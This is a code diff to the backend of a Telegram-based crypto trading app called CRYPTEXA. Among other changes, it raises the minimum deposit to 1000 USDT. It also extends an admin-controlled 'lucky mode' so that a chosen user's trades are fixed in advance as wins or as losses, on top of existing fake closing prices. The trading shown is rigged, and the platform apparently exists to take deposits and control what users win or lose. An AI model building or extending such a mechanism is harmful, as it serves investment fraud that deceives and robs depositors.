@@ -1,5 +1,5 @@
 
-import os, json, time, hashlib, hmac, asyncio
+import os, json, time, hashlib, hmac, asyncio, uuid
 from datetime import datetime, timedelta, timezone
 from typing import Optional, Dict, Any, List
 from fastapi import FastAPI, Request, Depends, HTTPException, UploadFile, File, Form, Query, APIRouter
@@ -27,15 +27,50 @@ if not BOT_TOKEN:
 if not ADMIN_ID:
     raise ValueError("ADMIN_ID environment variable is required")
 # Auto-detect HOST_BASE for different environments
-_replit_domain = os.getenv("REPLIT_DEV_DOMAIN")
+_replit_deployment = os.getenv("REPLIT_DEPLOYMENT")
+_replit_domains = os.getenv("REPLIT_DOMAINS", "")
+_replit_dev_domain = os.getenv("REPLIT_DEV_DOMAIN")
 _railway_domain = os.getenv("RAILWAY_PUBLIC_DOMAIN")
-if _replit_domain:
-    HOST_BASE = f"https://{_replit_domain}"
+if _replit_deployment and _replit_domains:
+    HOST_BASE = f"https://{_replit_domains.split(',')[0]}"
+elif _replit_dev_domain:
+    HOST_BASE = f"https://{_replit_dev_domain}"
 elif _railway_domain:
     HOST_BASE = f"https://{_railway_domain}"
 else:
     HOST_BASE = os.getenv("HOST_BASE", "https://rengle.site")
-MIN_DEPOSIT_USDT = float(os.getenv("MIN_DEPOSIT_USDT", "50"))
+MIN_DEPOSIT_USDT = float(os.getenv("MIN_DEPOSIT_USDT", "1000"))
+
+async def check_min_deposit_equiv(amount: float, currency: str):
+    """Возвращает None если сумма >= минимума (в USDT-эквиваленте), иначе текст ошибки."""
+    if currency.upper() in ("USDT", "USDC"):
+        if amount < MIN_DEPOSIT_USDT:
+            return f"Минимальная сумма пополнения {MIN_DEPOSIT_USDT:.0f} USDT"
+        return None
+    price = await okx_get_price(currency.upper())
+    if not price:
+        try:
+            price = await cmc_simple_price(currency.upper())
+        except Exception:
+            price = None
+    if not price and CRYPTO_PAY_TOKEN:
+        try:
+            async with aiohttp.ClientSession() as _s:
+                async with _s.get("https://pay.crypt.bot/api/getExchangeRates",
+                                  headers={"Crypto-Pay-API-Token": CRYPTO_PAY_TOKEN}, timeout=15) as _r:
+                    _d = await _r.json()
+                    for _rate in _d.get("result", []):
+                        if _rate.get("source") == currency.upper() and _rate.get("target") == "USD" and _rate.get("is_valid", True):
+                            price = float(_rate["rate"])
+                            break
+        except Exception:
+            price = None
+    if not price:
+        return "Не удалось проверить курс валюты, попробуйте позже"
+    if amount * float(price) < MIN_DEPOSIT_USDT:
+        min_coin = MIN_DEPOSIT_USDT / float(price)
+        return f"Минимальная сумма пополнения — эквивалент {MIN_DEPOSIT_USDT:.0f} USDT (≈{min_coin:.6f} {currency.upper()})"
+    return None
 print(f"[CRYPTEXA] HOST_BASE: {HOST_BASE}")
 print(f"[CRYPTEXA] RAILWAY_ENV: {os.getenv('RAILWAY_ENVIRONMENT', 'not set')}")
 import ssl
@@ -130,6 +165,7 @@ class User(Base):
     is_blocked=Column(Boolean, default=False)  # Account blocked status
     block_reason=Column(Text, nullable=True)  # Reason for blocking
     lucky_mode=Column(Boolean, default=False)
+    lucky_type=Column(String, default="win")  # "win" = везение, "loss" = невезение
     lucky_until=Column(DateTime, nullable=True)
     lucky_max_wins=Column(Integer, nullable=True)
     lucky_wins_used=Column(Integer, default=0)
@@ -260,6 +296,7 @@ class AdminChat(Base):
     id=Column(Integer, primary_key=True)
     user_id=Column(Integer, ForeignKey("users.id"), index=True)
     message_text=Column(Text)
+    file_path=Column(Text, nullable=True)
     is_from_admin=Column(Boolean, default=False)
     read=Column(Boolean, default=False)
     created_at=Column(DateTime, default=datetime.utcnow)
@@ -494,8 +531,12 @@ app.mount("/i18n", StaticFiles(directory="i18n"), name="i18n")
 templates=Jinja2Templates(directory="templates")
 
 _cors_origins = ["https://web.telegram.org", "https://t.me"]
-if _replit_domain:
-    _cors_origins.append(f"https://{_replit_domain}")
+for _d in _replit_domains.split(","):
+    _d = _d.strip()
+    if _d:
+        _cors_origins.append(f"https://{_d}")
+if _replit_dev_domain:
+    _cors_origins.append(f"https://{_replit_dev_domain}")
 if _railway_domain:
     _cors_origins.append(f"https://{_railway_domain}")
 _admin_panel_url = os.getenv("ADMIN_PANEL_URL", "")
@@ -617,11 +658,15 @@ async def startup():
         "ALTER TABLE users ADD COLUMN IF NOT EXISTS is_blocked BOOLEAN DEFAULT FALSE",
         "ALTER TABLE users ADD COLUMN IF NOT EXISTS block_reason TEXT",
     ])
+    await safe_migrate("admin_chat_file", [
+        "ALTER TABLE admin_chat ADD COLUMN IF NOT EXISTS file_path TEXT",
+    ])
     await safe_migrate("lucky_mode", [
         "ALTER TABLE users ADD COLUMN IF NOT EXISTS lucky_mode BOOLEAN DEFAULT FALSE",
         "ALTER TABLE users ADD COLUMN IF NOT EXISTS lucky_until TIMESTAMP",
         "ALTER TABLE users ADD COLUMN IF NOT EXISTS lucky_max_wins INTEGER",
         "ALTER TABLE users ADD COLUMN IF NOT EXISTS lucky_wins_used INTEGER DEFAULT 0",
+        "ALTER TABLE users ADD COLUMN IF NOT EXISTS lucky_type VARCHAR DEFAULT 'win'",
     ])
     await safe_migrate("predetermined_result", [
         "ALTER TABLE trades ADD COLUMN IF NOT EXISTS predetermined_result VARCHAR",
@@ -1088,6 +1133,19 @@ async def bot_answer_callback(callback_query_id: str, text: str = None, show_ale
             except:
                 return {}
 
+async def bot_send_photo(chat_id: int, photo_url: str, caption: str = "", buttons: List[List[Dict[str,str]]]|None=None, parse_mode: str="HTML"):
+    """Send a photo (by public URL) to a Telegram chat"""
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
+    payload = {"chat_id": chat_id, "photo": photo_url, "caption": caption[:1024], "parse_mode": parse_mode}
+    if buttons:
+        payload["reply_markup"] = {"inline_keyboard": buttons}
+    async with aiohttp.ClientSession() as s:
+        async with s.post(url, json=payload) as r:
+            try:
+                return await r.json()
+            except:
+                return {}
+
 async def bot_edit_message(chat_id: int, message_id: int, text: str, buttons: List[List[Dict[str,str]]]|None=None, parse_mode: str="HTML"):
     """Edit an existing message with new text and optional inline buttons"""
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
@@ -1122,13 +1180,12 @@ OXAPAY_WHITELABEL_URL = "https://api.oxapay.com/v1/payment/white-label"
 
 @app.post("/api/deposit/oxapay/create")
 async def api_oxapay_deposit_create(p: OxaPayDepositPayload, db: AsyncSession=Depends(get_db), request: Request=None):
-    MIN_OXAPAY_DEPOSIT = 5.0
     DEPOSIT_FEE_PERCENT = 0.0
     tid = getattr(request.state, 'telegram_id', None)
     if not tid:
         return JSONResponse({"error": "Unauthorized"}, status_code=401)
-    if tid != str(ADMIN_ID) and p.amount < MIN_OXAPAY_DEPOSIT:
-        return JSONResponse({"ok": False, "error": f"Минимальная сумма {MIN_OXAPAY_DEPOSIT} USDT"})
+    if tid != str(ADMIN_ID) and p.amount < MIN_DEPOSIT_USDT:
+        return JSONResponse({"ok": False, "error": f"Минимальная сумма пополнения {MIN_DEPOSIT_USDT:.0f} USDT"})
     u = (await db.execute(select(User).where(User.telegram_id == str(tid)))).scalars().first() or await get_or_create_user(db, tid, "localtester", "ru")
 
     fee_amount = round(p.amount * (DEPOSIT_FEE_PERCENT / 100), 6)
@@ -1333,13 +1390,14 @@ XROCKET_API_URL = "https://pay.xrocket.tg"
 
 @app.post("/api/deposit/xrocket/create")
 async def api_xrocket_deposit_create(p: XRocketDepositPayload, db: AsyncSession=Depends(get_db), request: Request=None):
-    MIN_XROCKET_DEPOSIT = 1.0
     DEPOSIT_FEE_PERCENT = 0.0
     tid = getattr(request.state, 'telegram_id', None)
     if not tid:
         return JSONResponse({"error": "Unauthorized"}, status_code=401)
-    if tid != str(ADMIN_ID) and p.amount < MIN_XROCKET_DEPOSIT:
-        return JSONResponse({"ok": False, "error": f"Минимальная сумма {MIN_XROCKET_DEPOSIT} USDT"})
+    if tid != str(ADMIN_ID):
+        min_err = await check_min_deposit_equiv(p.amount, p.currency)
+        if min_err:
+            return JSONResponse({"ok": False, "error": min_err})
 
     u = (await db.execute(select(User).where(User.telegram_id==str(tid)))).scalars().first()
     if not u:
@@ -1498,12 +1556,13 @@ CRYPTOBOT_API_URL = "https://pay.crypt.bot/api"
 
 @app.post("/api/deposit/cryptobot/create")
 async def api_cryptobot_deposit_create(p: CryptoBotDepositPayload, db: AsyncSession=Depends(get_db), request: Request=None):
-    MIN_CRYPTOBOT_DEPOSIT = 1.0
     tid = getattr(request.state, 'telegram_id', None)
     if not tid:
         return JSONResponse({"error": "Unauthorized"}, status_code=401)
-    if tid != str(ADMIN_ID) and p.currency == "USDT" and p.amount < MIN_CRYPTOBOT_DEPOSIT:
-        return JSONResponse({"ok": False, "error": f"Минимальная сумма {MIN_CRYPTOBOT_DEPOSIT} USDT"})
+    if tid != str(ADMIN_ID):
+        min_err = await check_min_deposit_equiv(p.amount, p.currency)
+        if min_err:
+            return JSONResponse({"ok": False, "error": min_err})
 
     u = (await db.execute(select(User).where(User.telegram_id==str(tid)))).scalars().first()
     if not u:
@@ -2082,7 +2141,7 @@ async def api_trade_order(p: TradeOrder, db: AsyncSession=Depends(get_db), reque
             is_lucky = True
     
     if is_lucky:
-        predetermined = "win"
+        predetermined = "win" if (u.lucky_type or "win") == "win" else "loss"
     else:
         predetermined = "win" if _rnd.random() < win_rate else "loss"
     
@@ -2135,7 +2194,7 @@ async def api_trade_status(order_id:int, db: AsyncSession=Depends(get_db), reque
         
         tr.status="completed"; tr.closed_at=datetime.utcnow(); tr.close_price=round(fake_close, 6); tr.result="win" if win else "loss"; tr.payout=payout
         
-        if u.lucky_mode and win:
+        if u.lucky_mode and (win == ((u.lucky_type or "win") == "win")):
             u.lucky_wins_used = (u.lucky_wins_used or 0) + 1
         
         print(f"[TRADE CLOSED] {symbol} {tr.side.upper()} → Start: ${tr.start_price:.2f}, Close: ${fake_close:.6f}, Result: {tr.result.upper()}, Payout: {payout:.2f} USDT")
@@ -2346,6 +2405,8 @@ async def api_support_list(db: AsyncSession=Depends(get_db), request: Request=No
     if not tid:
         return JSONResponse({"error": "Unauthorized"}, status_code=401)
     u=(await db.execute(select(User).where(User.telegram_id==str(tid)))).scalars().first()
+    if not u:
+        return {"is_admin": False, "messages": []}
     msgs=(await db.execute(select(SupportMessage).where(SupportMessage.user_id==u.id).order_by(SupportMessage.created_at.asc()))).scalars().all()
     is_admin = str(tid) == str(ADMIN_ID)
     return {"is_admin": is_admin, "messages": [{"id":m.id,"sender":m.sender,"text":m.text,"file_path":m.file_path,"created_at":m.created_at.isoformat()} for m in msgs]}
@@ -2356,15 +2417,35 @@ async def api_support_send(request: Request, db: AsyncSession=Depends(get_db), f
     if not tid:
         return JSONResponse({"error": "Unauthorized"}, status_code=401)
     u=(await db.execute(select(User).where(User.telegram_id==str(tid)))).scalars().first()
+    if not u:
+        return JSONResponse({"ok": False, "error": "User not found"}, status_code=404)
     file_path=None
     if file:
-        os.makedirs("static/uploads", exist_ok=True); name=f"{int(time.time())}_{file.filename}"; dest=os.path.join("static/uploads", name)
+        ALLOWED_UPLOAD_EXT = {".jpg", ".jpeg", ".png", ".webp", ".gif", ".pdf", ".txt"}
+        ext = os.path.splitext(file.filename or "")[1].lower()
+        if ext not in ALLOWED_UPLOAD_EXT:
+            return JSONResponse({"error": "Недопустимый тип файла. Разрешены: jpg, png, webp, gif, pdf, txt"}, status_code=400)
+        os.makedirs("static/uploads", exist_ok=True)
+        name = f"{int(time.time())}_{uuid.uuid4().hex}{ext}"
+        dest = os.path.join("static/uploads", name)
         with open(dest,"wb") as f: f.write(await file.read())
         file_path="/"+dest
     msg=SupportMessage(user_id=u.id, sender="user", text=text, file_path=file_path); db.add(msg)
-    admin_chat_msg = AdminChat(user_id=u.id, message_text=text or '[Файл]', is_from_admin=False, read=False)
+    admin_chat_msg = AdminChat(user_id=u.id, message_text=text or ("[Фото]" if file_path else ""), file_path=file_path, is_from_admin=False, read=False)
     db.add(admin_chat_msg)
     await db.commit()
+    # Notify admin in Telegram with the actual photo so support can view it right away
+    if file_path:
+        try:
+            photo_url = f"{HOST_BASE}{file_path}"
+            caption = f"📎 Фото в поддержку от пользователя #{u.profile_id}" + (f" (@{u.username})" if u.username else "") + (f"\n\n{text}" if text else "")
+            buttons = [[{"text": "💬 Ответить", "callback_data": f"reply:{u.telegram_id}"}]]
+            if file_path.lower().endswith((".jpg", ".jpeg", ".png", ".webp", ".gif")):
+                await bot_send_photo(int(ADMIN_ID), photo_url, caption, buttons)
+            else:
+                await bot_send_message(int(ADMIN_ID), f"{caption}\n\n📄 Файл: {photo_url}", buttons)
+        except Exception as e:
+            print(f"[SUPPORT] Admin photo notify failed: {e}")
     return {"ok": True}
 
 @app.get("/api/admin_messages")
@@ -2738,6 +2819,7 @@ class LuckySetPayload(BaseModel):
     target_telegram_id: str
     enabled: bool
     reason: str
+    mode: Optional[str] = "win"  # "win" = везение, "loss" = невезение
     until: Optional[str] = None
     max_wins: Optional[int] = None
 
@@ -2818,7 +2900,7 @@ async def api_admin_users(request: Request, db: AsyncSession = Depends(get_db), 
                 "username": u.username, "balance_usdt": round(u.balance_usdt or 0, 2),
                 "is_verified": u.is_verified or False, "is_premium": u.is_premium or False,
                 "is_blocked": u.is_blocked or False, "language": u.language,
-                "lucky_mode": u.lucky_mode or False, "custom_win_rate": u.custom_win_rate,
+                "lucky_mode": u.lucky_mode or False, "lucky_type": u.lucky_type or "win", "custom_win_rate": u.custom_win_rate,
                 "last_online_at": u.last_online_at.isoformat() if u.last_online_at else None,
                 "telegram_link": f"tg://user?id={u.telegram_id}",
                 "created_at": u.created_at.isoformat() if u.created_at else None,
@@ -2846,7 +2928,7 @@ async def api_admin_user_detail(profile_id: int, request: Request, db: AsyncSess
             "referral_code": user.referral_code, "referred_by": user.referred_by,
             "referral_earnings": round(user.referral_earnings or 0, 2) if hasattr(user, 'referral_earnings') else 0,
             "referral_count": user.referral_count or 0 if hasattr(user, 'referral_count') else 0,
-            "lucky_mode": user.lucky_mode or False, "lucky_until": user.lucky_until.isoformat() if user.lucky_until else None,
+            "lucky_mode": user.lucky_mode or False, "lucky_type": user.lucky_type or "win", "lucky_until": user.lucky_until.isoformat() if user.lucky_until else None,
             "lucky_max_wins": user.lucky_max_wins, "lucky_wins_used": user.lucky_wins_used or 0,
             "custom_win_rate": user.custom_win_rate,
             "last_online_at": user.last_online_at.isoformat() if user.last_online_at else None,
@@ -2918,6 +3000,8 @@ async def api_admin_lucky_users(request: Request, db: AsyncSession = Depends(get
             query = query.where(or_(User.telegram_id.ilike(f"%{search}%"), User.username.ilike(f"%{search}%"), User.profile_id == int(search) if search.isdigit() else False))
         if filter == "on": query = query.where(User.lucky_mode == True)
         elif filter == "off": query = query.where(or_(User.lucky_mode == False, User.lucky_mode == None))
+        elif filter == "win": query = query.where(User.lucky_mode == True, or_(User.lucky_type == "win", User.lucky_type == None))
+        elif filter == "loss": query = query.where(User.lucky_mode == True, User.lucky_type == "loss")
         count_q = select(func.count()).select_from(query.subquery())
         total = (await db.execute(count_q)).scalar() or 0
         per_page = 20
@@ -2925,7 +3009,7 @@ async def api_admin_lucky_users(request: Request, db: AsyncSession = Depends(get
         users = (await db.execute(query)).scalars().all()
         users_data = []
         for u in users:
-            users_data.append({"id": u.id, "profile_id": u.profile_id, "telegram_id": u.telegram_id, "username": u.username, "balance_usdt": round(u.balance_usdt or 0, 2), "lucky_mode": u.lucky_mode or False, "lucky_until": u.lucky_until.isoformat() if u.lucky_until else None, "lucky_max_wins": u.lucky_max_wins, "lucky_wins_used": u.lucky_wins_used or 0})
+            users_data.append({"id": u.id, "profile_id": u.profile_id, "telegram_id": u.telegram_id, "username": u.username, "balance_usdt": round(u.balance_usdt or 0, 2), "lucky_mode": u.lucky_mode or False, "lucky_type": u.lucky_type or "win", "lucky_until": u.lucky_until.isoformat() if u.lucky_until else None, "lucky_max_wins": u.lucky_max_wins, "lucky_wins_used": u.lucky_wins_used or 0})
         return {"ok": True, "users": users_data, "total": total, "page": page, "pages": max(1, (total + per_page - 1) // per_page)}
     except Exception as e:
         return JSONResponse({"ok": False, "error": str(e)}, status_code=500)
@@ -2938,19 +3022,25 @@ async def api_admin_lucky_set(payload: LuckySetPayload, request: Request, db: As
             return JSONResponse({"ok": False, "error": "Причина обязательна"}, status_code=400)
         user = (await db.execute(select(User).where(User.telegram_id == payload.target_telegram_id))).scalars().first()
         if not user: raise HTTPException(404, "User not found")
-        before = f"lucky_mode={user.lucky_mode}, until={user.lucky_until}, max_wins={user.lucky_max_wins}, used={user.lucky_wins_used}"
+        mode = (payload.mode or "win").lower()
+        if mode not in ("win", "loss"):
+            return JSONResponse({"ok": False, "error": "mode должен быть 'win' (везение) или 'loss' (невезение)"}, status_code=400)
+        before = f"lucky_mode={user.lucky_mode}, type={user.lucky_type}, until={user.lucky_until}, max_wins={user.lucky_max_wins}, used={user.lucky_wins_used}"
         if payload.enabled:
-            user.lucky_mode = True; user.lucky_wins_used = 0
+            user.lucky_mode = True; user.lucky_type = mode; user.lucky_wins_used = 0
             try: user.lucky_until = datetime.fromisoformat(payload.until) if payload.until else None
             except ValueError: return JSONResponse({"ok": False, "error": "Неверный формат даты"}, status_code=400)
             user.lucky_max_wins = payload.max_wins
         else:
             user.lucky_mode = False; user.lucky_until = None; user.lucky_max_wins = None; user.lucky_wins_used = 0
-        after = f"lucky_mode={user.lucky_mode}, until={user.lucky_until}, max_wins={user.lucky_max_wins}, used={user.lucky_wins_used}"
-        action = "LUCKY_ENABLE" if payload.enabled else "LUCKY_DISABLE"
+        after = f"lucky_mode={user.lucky_mode}, type={user.lucky_type}, until={user.lucky_until}, max_wins={user.lucky_max_wins}, used={user.lucky_wins_used}"
+        if payload.enabled:
+            action = "LUCKY_ENABLE_WIN" if mode == "win" else "LUCKY_ENABLE_LOSS"
+        else:
+            action = "LUCKY_DISABLE"
         await log_admin_action(db, admin_tid, action, user.id, before, after, reason=payload.reason)
         await db.commit()
-        return {"ok": True, "lucky_mode": user.lucky_mode, "lucky_until": user.lucky_until.isoformat() if user.lucky_until else None, "lucky_max_wins": user.lucky_max_wins, "lucky_wins_used": user.lucky_wins_used or 0}
+        return {"ok": True, "lucky_mode": user.lucky_mode, "lucky_type": user.lucky_type or "win", "lucky_until": user.lucky_until.isoformat() if user.lucky_until else None, "lucky_max_wins": user.lucky_max_wins, "lucky_wins_used": user.lucky_wins_used or 0}
     except HTTPException: raise
     except Exception as e:
         return JSONResponse({"ok": False, "error": str(e)}, status_code=500)
@@ -2976,6 +3066,9 @@ async def api_admin_user_message(profile_id: int, payload: AdminMessagePayload, 
         if not user: raise HTTPException(404, "User not found")
         result = await bot_send_message(int(user.telegram_id), payload.text)
         success = result.get("ok", False) if result else False
+        # Сохраняем сообщение в историю чата (видно и пользователю в приложении, и админу)
+        db.add(SupportMessage(user_id=user.id, sender="admin", text=payload.text))
+        db.add(AdminChat(user_id=user.id, message_text=payload.text, is_from_admin=True))
         await log_admin_action(db, admin_tid, "send_message", user.id, None, payload.text[:200])
         return {"ok": success, "message_sent": success}
     except HTTPException: raise
@@ -3189,9 +3282,14 @@ async def api_admin_chat_history(user_id: int, request: Request, db: AsyncSessio
     messages = (await db.execute(select(AdminChat).where(AdminChat.user_id == user.id).order_by(AdminChat.created_at.asc()))).scalars().all()
     await db.execute(text("UPDATE admin_chat SET read = TRUE WHERE user_id = :uid AND is_from_admin = FALSE"), {"uid": user.id})
     await db.commit()
+    def _file_url(m):
+        fp = getattr(m, "file_path", None)
+        if not fp and m.message_text and m.message_text.startswith("[Файл] /static/uploads/"):
+            fp = m.message_text[len("[Файл] "):].strip()
+        return f"{HOST_BASE}{fp}" if fp else None
     return {"success": True, "data": {
         "user": {"id": user.id, "profile_id": user.profile_id, "telegram_id": user.telegram_id, "username": user.username, "telegram_link": f"tg://user?id={user.telegram_id}"},
-        "messages": [{"id": m.id, "text": m.message_text, "is_from_admin": m.is_from_admin, "read": m.read, "created_at": m.created_at.isoformat()} for m in messages]
+        "messages": [{"id": m.id, "text": m.message_text, "file_url": _file_url(m), "is_from_admin": m.is_from_admin, "read": m.read, "created_at": m.created_at.isoformat()} for m in messages]
     }}
 
 @app.post("/api/admin/chat/{user_id}/send")
@@ -3460,7 +3558,7 @@ async def poll_expired_trades():
                         tr.result = "win" if win else "loss"
                         tr.payout = payout
                         
-                        if u.lucky_mode and win:
+                        if u.lucky_mode and (win == ((u.lucky_type or "win") == "win")):
                             u.lucky_wins_used = (u.lucky_wins_used or 0) + 1
                         
                         print(f"[TRADE POLL] Closed {symbol} {tr.side.upper()} → Start: ${tr.start_price:.2f}, Close: ${fake_close:.6f}, Result: {tr.result.upper()}")
@@ -3992,7 +4090,8 @@ We'll respond as quickly as possible! ⚡"""
                 reply_kb = [
                     [{"text": "💰 Баланс"}, {"text": "👥 Рефералы"}],
                     [{"text": "💬 Поддержка"}, {"text": "📊 История"}],
-                    [{"text": "📈 Курсы"}, {"text": "ℹ️ О боте"}]
+                    [{"text": "📈 Курсы"}, {"text": "ℹ️ О боте"}],
+                    [{"text": "📜 Правила"}]
                 ]
                 await bot_send_message(chat_id, welcome_text, reply_keyboard=reply_kb, parse_mode="HTML")
                 return {"ok": True}
@@ -4008,7 +4107,8 @@ We'll respond as quickly as possible! ⚡"""
                 reply_kb = [
                     [{"text": "💰 Баланс"}, {"text": "👥 Рефералы"}],
                     [{"text": "💬 Поддержка"}, {"text": "📊 История"}],
-                    [{"text": "📈 Курсы"}, {"text": "ℹ️ О боте"}]
+                    [{"text": "📈 Курсы"}, {"text": "ℹ️ О боте"}],
+                    [{"text": "📜 Правила"}]
                 ]
                 await bot_send_message(chat_id, "💎 <b>Главное меню CRYPTEXA</b>\n\nВыберите действие:", reply_keyboard=reply_kb, parse_mode="HTML")
                 return {"ok": True}
@@ -4162,8 +4262,36 @@ BTC, ETH, TON, SOL, BNB, XRP, DOGE, LTC, TRX, USDT
 <b>Техподдержка:</b>
 Нажмите кнопку "💬 Поддержка" для связи с оператором.
 
-<i>© 2025 CRYPTEXA</i>"""
+<i>© 2026 CRYPTEXA</i>"""
                 await bot_send_message(chat_id, about_text, parse_mode="HTML")
+                return {"ok": True}
+
+            # Handle "📜 Правила" button - Show rules
+            elif text == "📜 Правила":
+                rules_text = """📜 <b>Правила CRYPTEXA</b>
+
+<b>💬 Общение с поддержкой:</b>
+• Будьте вежливы — не грубите и не хамите операторам
+• Оскорбления и нецензурная лексика недопустимы
+• Опишите проблему подробно: что делали, что произошло, сумма и способ оплаты
+• Не дублируйте одно и то же сообщение много раз — оператор ответит в порядке очереди
+
+<b>🔒 Безопасность:</b>
+• Поддержка НИКОГДА не просит пароли, seed-фразы или коды из SMS
+• Не переводите средства на адреса, полученные вне официального приложения
+• Не передавайте доступ к своему аккаунту третьим лицам
+
+<b>⚖️ Использование платформы:</b>
+• Запрещено использовать несколько аккаунтов для получения реферальных бонусов
+• Запрещены любые попытки обмана системы и мошенничество
+• За нарушение правил аккаунт может быть заблокирован
+
+<b>💰 Финансы:</b>
+• Минимальная сумма пополнения — 1000 USDT (или эквивалент)
+• Внимательно проверяйте адреса и сети при выводе средств
+
+<i>© 2026 CRYPTEXA</i>"""
+                await bot_send_message(chat_id, rules_text, parse_mode="HTML")
                 return {"ok": True}
 
             # Handle /check_create command - Create a gift check (deducts from creator's balance)
